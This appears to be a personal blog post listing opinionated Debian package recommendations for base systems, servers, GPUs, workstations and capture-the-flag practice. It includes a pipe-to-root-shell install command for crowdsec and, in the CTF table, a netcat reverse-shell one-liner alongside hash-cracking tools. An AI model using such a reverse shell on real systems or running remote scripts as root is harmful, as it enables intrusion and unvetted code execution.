# Random Linux Package Recommendations (RLPR)

This is what I like to take as a basis for my systems. The recommendations are specific to _debian_ and _very_ opinionated. Take it with a grain of salt.

The list is neither complete nor ideal, but it is a starting point of packages I usually install on my linux systems.

I was intending to complete and improve the list, but if I wait for that I will never publish my package recommendations. Therefore I'll just publish the draft list now, and I'll update it whenever it is necessary.

The list works best in Debian (and probably most debian derived distributions)

## Base System

I usually install the base packages on most systems I plan to use regularly via SSH or GUI. The tools make my life easier and

```shell
apt install -y sudo docker.io docker-compose docker-buildx htop rsync nfs-common curl wget lynx open-iscsi earlyoom git git-lfs smartmontools lm-sensors imagemagick restic
```

| Package        | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| sudo           | Depending on how you setup debian, it might come with sudo, or not (if you setup a root password on a minimal system, sudo is not installed). Anyways, I like having sudo for consistency; though it is definitely not required.                                                                                                                                                                                                                                                                 |
| docker.io      | You always need docker containers, be it workstations or servers, it's basically always needed. According to the debian package, it's not recommended to run docker.io on arm, but I haven't encountered any issues so far running docker containers via docker.io on arm machines (raspberry PI). Nowadays there are alternative solutions such as `podman` or `containerd`, but due to inertia I have not migrated from docker yet.                                                            |
| docker-compose | Easier management of docker containers. I often setup custom services to run on my machines via docker containers, and then I use `docker-compose` as the configuration file to be managed via `systemd` units for example.                                                                                                                                                                                                                                                                      |
| docker-buildx  | Extended docker build capabilities. Not always necessary, but nice to have.                                                                                                                                                                                                                                                                                                                                                                                                                      |
| htop           | This terminal application provides a quick overview over the system status (think: windows task manager, for instance). Practical to have, and nicer than `top` which is preinstalled.                                                                                                                                                                                                                                                                                                           |
| rsync          | Often used for syncing files between two computers or directories efficiently. `rsync` used to be my main backup program (backing up my computer to a remote NAS). However, I have come to switch to `restic` (in combination with `rear` if x86) these days. Still it is sometimes useful to have rsync, although it is one of the programs I would consider dropping from the list.                                                                                                            |
| nfs-common     | I often use `nfs` shares, so I install `nfs-common` in case I need a quick nfs mount.                                                                                                                                                                                                                                                                                                                                                                                                            |
| curl           | Command line tool to make web requests. It is always useful to be able to make calls to web URLs from the command line.                                                                                                                                                                                                                                                                                                                                                                          |
| wget           | Same as curl, but a bit easier if you just want to download a file (such as a huggingface llm model, for instance).                                                                                                                                                                                                                                                                                                                                                                              |
| lynx           | Command line browser. If you need to access a website from the command line, a great tool to have.                                                                                                                                                                                                                                                                                                                                                                                               |
| open-iscsi     | For mounting iscsi shares. Can be useful if you need to access such a share. Not required otherwise.                                                                                                                                                                                                                                                                                                                                                                                             |
| earlyoom       | In my opinion, which is very opinionated on this matter, earlyoom makes the Linux experience much more bearable (unless you have a lot of fast swap). Earlyoom triggers out of memory kills faster than the kernel, so instead of a linux machine becoming unresponsive when running out of RAM, it'll be a program crashing.                                                                                                                                                                    |
| git            | Git is the de facto standard for source code and change history management. If there is any one tool _every_ developer should use, then it is git. I think, due to LLMs ("AI") coding, it has become an even more important tool to manage and review the deluge of code produced nowadays.                                                                                                                                                                                                      |
| git-lfs        | git-lfs is an extension to git in order to manage large files in the source code, as git works best with plain text files.                                                                                                                                                                                                                                                                                                                                                                       |
| smartmontools  | These tools are useful to check the health of your hard disk drives (HDD) and solid disk drives (SSD) via `sudo smartctl -a /dev/nvme0`.                                                                                                                                                                                                                                                                                                                                                         |
| lm-sensors     | This package provides a way to nicely display CPU / PCIe sensor values. In other words, you can easily and quickly see your CPU and GPU temperatures via `sudo sensors`.                                                                                                                                                                                                                                                                                                                         |
| imagemagick    | Imagemagick is a great tool to convert files between different formats. For instance, the following command will take a bunch of scanned `.png` files (at 600 dpi) and embed them in a multi-page pdf, while reducing the file-size by decreasing the dpi to 300 and converting the images to jpg files within the pdf: `convert /home/user/Documents/scan/important-document-page-*.png -density 300 -resize 5000x5000 -quality 70 -compress jpeg /home/user/Documents/important-document.pdf`. |
| restic         | I have tried many different backup solutions, but restic is by far the best one I found so far. It is very efficient at creating incremental backups even for large datasets, and it can easily back up to a S3 storage provider or to it's own restic rest server.                                                                                                                                                                                                                              |

### Base / ARM

There are no additional packages I specifically recommend for ARM devices.

### Base / x86

In addition to the base packages above, I also install the below package for x86 devices - mainly because they're not available on ARM.

```shell
apt install rear
```

| Package | Description                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| rear    | Rear is a great application to back up linux systems. Unfortunately not available on arm. How to configure and setup `rear` actually deserves a separate article. Anyways, rear is great, because it creates a bootable image that can re-create a broken server on similar hardware (or reimagine the server, if it broke due to some updates). From that perspective it is complementary to restic which creates a data backup. |
|         |                                                                                                                                                                                                                                                                                                                                                                                                                                   |

## Additional Optional Packages

The following are strictly optional (and opinionated) packages. They're not suitable for every use case, and I definitely do not recommend blindly installing them. On the other hand, if you're trying to accomplish a specific goal they might be useful to know and install.

## Server

```
apt install netdata
```

| Package | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| netdata | Netdata used to be a very lightweight way to host a headless website detailing the most important statistics of any linux server. Unfortunately with time it has become quite bloated; and is focused on cloud / ai capabilities, which are quite irrelevant to me. For that reason I have all but removed netdata from my machines. It can still be an easy way to diagnose performance issues on a server if you prefer to browse a website instead of using CLI tools or giving an LLM model access to the server. |

### Server, Security

The below packages can be installed on a server in order improve the security and block malicious clients. However, just installing them is not enough - the applications need to be configured properly in order to have the desired effect. Therefore, if installing them, the time needs to be taken to investigate and setup proper configuration.

```shell
curl -s https://install.crowdsec.net | sudo sh
sudo apt install crowdsec
sudo apt install fail2ban
```

| Package  | Description                                                                                                                                                                                                                                                                                                           |
| -------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| fail2ban | Fail2ban is a lightweight solution to read local logs and ban offending IP addresses. For instance, it allows blocking clients that are trying to brute force SSH logins or websites.                                                                                                                                 |
| crowdsec | Crowdsec is a fancier fail2ban. It is basically also used to block malicious requests / clients. My recent experience has been positive enough, so that I usually skip fail2ban and only use crowdsec for my exposed servers. I like to think of it as my own little self-hosted cloudflare web application firewall. |
| clamav   | Clamav is a Linux antivirus scanner. It can be useful, for instance to allow for scanning emails received. It uses quite some resources though; therefore I would only recommend installing clamav if the use case requires it.                                                                                       |

## AMD GPU

```shell
apt install radeontop
```

| Package   | Description                                                                                                                                                                                                                                                                                                                                                          |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| radeontop | Is a small CLI tool to see the status of your AMD GPU. Great to quickly check on the GPU utilization and VRAM usage.                                                                                                                                                                                                                                                 |
| LACT      | Unfortunately, LACT has to be installed from [github](https://github.com/ilya-zlobintsev/LACT). But it provides both a GUI and a CLI to configure and manage a GPU on Linux. From the perspective of functionality, it is a better radeontop - however, radeontop can be quickly and easily installed from the official sources, and therefore wins on availability. |

## Workstation

```shell
apt install kubernetes-cli evolution-ews waydroid wireguard
```

| Package        | Description                                                                                                                                        |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| kubernetes-cli | Provides `kubectl`, useful to manage and interact with kubernetes clusters. If you use kubernetes, you'll probably want to have `kubernetes-cli`.  |
| evolution-ews  | Evolution is my preferred Mail client (on gnome), and if you want to connect to outlook exchange servers, you'll want the `evolution-ews` package. |
| waydroid       | Waydroid is a program to run Android applications on Linux.                                                                                        |
| wireguard      | Wireguard is a VPN program, and it is my VPN of choice, since I usually do not have to deal with any DPI firewalls that block VPN clients.         |

Some further tools to investigate / add to the list in the future.

- VM (virt manager, and deps)
- Development (linux-dev, cargo, cmake, gcc...)

## Capture The Flags & Cybersecurity

The below tools are some recommendations to install if you plan to participate in a capture the flag contest or if you want to educate yourself in cybersecurity.
I do not have a lot of experience in this area, so it is currently a rather basic list, to be expanded in the future.
If you want all the relevant tools installed, it is probably easy to just use a specialized Linux distribution such as [Kali](https://www.kali.org/) or [ParrotOS](https://www.parrotsec.org/). The drawback of these Linux distributions is that they are not as useful as other distributions for general computing / development. Therefore I prefer to install any tools I need onto a base Linux (or in a container).

| Package        | Description                                                                                                                                                                                                                                                                                                                                        |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| nmap           | Create a _map_ of _networks_. `nmap` can be used to enumerate                                                                                                                                                                                                                                                                                      |
| john           | Used to crack hashes. Sorry, it is a tool for password recovery. It has quite a few configuration options and it is not trivial to use. Therefore it is worth a dedicated article to have an in-depth look at it. I have to note, that in my experience it is necessary to compile john from the source code in order to get the best performance. |
| hashcat        | Similar to `john`, or an alternative to john. Focused on brute force.                                                                                                                                                                                                                                                                              |
| wireshark      | Capture and analyze network traffic.                                                                                                                                                                                                                                                                                                               |
| netcat-openbsd | Provides the `nc` commad, for instance to create a reverse shell via `nc 172.18.0.9 1337 -e sh`.                                                                                                                                                                                                                                                   |
|                |                                                                                                                                                                                                                                                                                                                                                    |
